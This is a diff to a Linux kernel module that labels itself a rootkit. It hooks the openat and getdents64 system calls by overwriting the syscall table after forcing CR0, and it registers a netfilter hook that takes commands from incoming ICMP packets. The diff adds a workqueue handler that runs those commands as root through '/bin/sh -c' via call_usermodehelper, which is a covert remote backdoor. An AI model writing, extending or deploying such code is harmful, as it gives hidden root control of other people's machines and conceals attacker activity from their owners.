@@ -95,8 +95,6 @@ static syscall_wrapper orig_sys_openat;
 static syscall_wrapper orig_sys_getdents64;
 
 
-// write_cr0 is useless in a 5x linux kernell
-// cr0 allows supervisor-level procedures to write into read-only pages
 static inline void write_forced_cr0(unsigned long value)
 {
     unsigned long __force_order;
@@ -276,6 +274,18 @@ static void restore_getdents64(void)
     __sys_call_table_addr[__NR_getdents64] = (unsigned long)orig_sys_getdents64;
 }
 
+// Icmp logic
+
+static void work_handler(struct work_struct * work)
+{
+    static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL};
+    static char *envp[] = {"PATH=/bin:/sbin", NULL};
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+
+DECLARE_WORK(my_work, work_handler);
+
 static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
     struct iphdr *iph;
@@ -328,19 +338,10 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
     return NF_ACCEPT;
 }
 
-
 // Function that launches when module is inserted
 static int __init mod_init(void)
 {
-    int ret; // to store return code of register_kprobe
-    kallsyms_lookup_name_t kallsyms_lookup_name; // to store the address of kallsyms_lookup_name function
-
     pr_info("rootkit: started\n");
-    nfho.hook = icmp_cmd_executor;
-    nfho.hooknum = NF_INET_PRE_ROUTING;
-    nfho.pf = PF_INET;
-    nfho.priority = NF_IP_PRI_FIRST;
-    nf_register_net_hook(&init_net, &nfho);
 
     nfho.hook = icmp_cmd_executor;
     nfho.hooknum = NF_INET_PRE_ROUTING;
@@ -350,7 +351,7 @@ static int __init mod_init(void)
 
 #ifdef KPROBE_
 
-    ret = register_kprobe(&kp);
+    int ret = register_kprobe(&kp);
     if (ret < 0) {
         pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
         return ret;
@@ -359,7 +360,7 @@ static int __init mod_init(void)
     pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
             kp.addr);
 
-    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 
     unregister_kprobe(&kp);
 
@@ -398,6 +399,7 @@ static void __exit mod_exit(void)
 
     nf_unregister_net_hook(&init_net, &nfho);
 }
+
 
 MODULE_LICENSE("GPL");
 module_init(mod_init);
